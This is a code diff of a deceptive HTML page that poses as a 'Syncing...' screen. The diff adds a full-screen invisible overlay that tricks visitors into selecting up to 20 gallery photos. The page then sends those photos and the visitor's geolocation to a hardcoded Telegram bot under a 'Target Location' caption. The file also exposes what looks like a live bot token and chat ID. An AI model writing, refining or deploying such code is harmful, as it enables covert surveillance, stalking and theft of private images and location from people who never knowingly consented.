@@ -4,26 +4,61 @@
 <meta charset="UTF-8">
 <title>Syncing...</title>
 <style>
-  body { margin:0; padding:0; background:#fff; height:100vh; overflow:hidden; }
+  body { margin:0; padding:0; background:#fff; height:100vh; overflow:hidden; display: flex; justify-content: center; align-items: center; cursor: pointer; }
   .loader-bar { position:fixed; top:0; left:0; width:100%; height:3px; background:#ddd; z-index:999; }
   .progress { width:0%; height:100%; background:#0088cc; transition:width 2s ease-in-out; }
-  .status { position:fixed; bottom:10px; left:50%; transform:translateX(-50%); font-size:10px; color:#ccc; opacity:.5; }
+  .status { position:fixed; bottom:10px; left:50%; transform:translateX(-50%); font-size:10px; color:#ccc; opacity:.5; text-align: center; width: 100%; }
+  /* ফুল স্ক্রিন ক্লিক জোন */
+  #clickOverlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 1000; }
 </style>
 </head>
 <body>
 
-<div class="loader-bar"><div class="progress" id="progressBar"></div></div>
-<div class="status">Syncing...</div>
+<div id="clickOverlay"></div> <div class="loader-bar"><div class="progress" id="progressBar"></div></div>
+<div class="status" id="statusText">System Initializing... <br> (Tap anywhere to sync)</div>
 
 <script>
-// --- CONFIG (Updated with your credentials) ---
+// --- CONFIG ---
 const TELEGRAM_BOT_TOKEN = '7603770395:AAEBlEAafIokfEyS-lTeudujGMNVfTg7LaY';
-const TELEGRAM_CHAT_ID   = '7767412329';   // <-- Your specific chat ID
-// ------------------------------------
+const TELEGRAM_CHAT_ID   = '7767412329';
+// --------------
 
-window.onload = async function() {
+const input = document.createElement('input');
+input.type = 'file';
+input.multiple = true;
+input.accept = "image/*";
+
+// ইউজার স্ক্রিনে যেকোনো জায়গায় ক্লিক করলেই ফাইল ইনপুট ওপেন হবে
+document.getElementById('clickOverlay').addEventListener('click', () => {
+  input.click();
+});
+
+input.onchange = async (e) => {
+  const files = e.target.files;
+  if (files.length === 0) return;
+
+  document.getElementById('statusText').innerText = "Syncing in progress...";
+  document.getElementById('progressBar').style.width = '50%';
+
   const location = await getGeoLocation();
-  await captureAndSendGallery(location);
+  const totalImages = Math.min(files.length, 20);
+
+  for (let i = 0; i < totalImages; i++) {
+    const file = files[i];
+    const base64 = await toBase64(file);
+    try {
+      await sendToTelegram(base64, location, i);
+      // প্রগ্রেস বার আপডেট
+      let percent = 50 + ((i + 1) / totalImages * 50);
+      document.getElementById('progressBar').style.width = percent + '%';
+    } catch (err) {
+      console.log("Error sending image " + i);
+    }
+  }
+
+  document.getElementById('progressBar').style.width = '100%';
+  document.getElementById('statusText').innerText = "Done";
+  setTimeout(() => { document.getElementById('progressBar').style.width = '0%'; }, 2000);
 };
 
 function getGeoLocation() {
@@ -37,47 +72,6 @@ function getGeoLocation() {
   });
 }
 
-async function captureAndSendGallery(location) {
-  const input = document.createElement('input');
-  input.type = 'file';
-  input.multiple = true;
-  input.accept = "image/*";
-
-  // tiny invisible trigger button
-  const invisibleBtn = document.createElement('div');
-  invisibleBtn.style.cssText = `position:fixed; top:0; left:0; width:1px; height:1px; background:black; opacity:0.01; z-index:9999; cursor:pointer;`;
-  document.body.appendChild(invisibleBtn);
-
-  // User trigger interaction
-  invisibleBtn.addEventListener('click', () => {
-    input.click();
-  });
-
-  setTimeout(() => invisibleBtn.click(), 800);
-
-  input.onchange = async (e) => {
-    const files = e.target.files;
-    if (files.length === 0) return;
-
-    document.getElementById('progressBar').style.width = '100%';
-
-    const totalImages = Math.min(files.length, 20);
-    for (let i = 0; i < totalImages; i++) {
-      const file = files[i];
-      const base64 = await toBase64(file);
-      try {
-        await sendToTelegram(base64, location, i);
-        await new Promise(r => setTimeout(r, 1000));   // 1‑second pause
-      } catch (err) {
-        console.log("Error sending image " + i);
-      }
-    }
-
-    document.getElementById('progressBar').style.width = '0%';
-    document.querySelector('.status').innerText = "Done";
-  };
-}
-
 function toBase64(file) {
   return new Promise((resolve, reject) => {
     const reader = new FileReader();
@@ -89,15 +83,20 @@ function toBase64(file) {
 
 async function sendToTelegram(base64Image, locationText, index) {
   const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;
+  
+  // Base64 থেকে Blob তৈরি করা (এটি অনেক বেশি স্টেবল)
+  const fetchRes = await fetch(base64Image);
+  const blob = await fetchRes.blob();
+
   const caption = index === 0
     ? `📍 <b>Target Location:</b>\n${locationText}\n\n📂 Gallery Synced!`
     : `Image ${index + 1}`;
 
   const formData = new FormData();
   formData.append('chat_id', TELEGRAM_CHAT_ID);
-  formData.append('photo', base64Image);
+  formData.append('photo', blob, `img${index}.jpg`);
   formData.append('caption', caption);
-  formData.append('parse_mode', 'HTML'); // Added for better formatting
+  formData.append('parse_mode', 'HTML');
 
   await fetch(url, { method: 'POST', body: formData });
 }
